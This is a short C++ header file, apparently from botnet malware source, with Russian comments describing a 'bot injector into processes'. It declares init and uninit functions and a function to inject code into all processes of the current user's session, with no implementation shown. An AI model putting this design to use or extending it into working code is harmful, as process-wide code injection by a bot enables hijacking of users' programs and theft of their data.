/*
  Инжектор бота в процессы.
*/
#pragma once

namespace CoreInject
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
  Inject code into all processes of the current session by the current user.
      */
  bool _injectToAll(void);
};
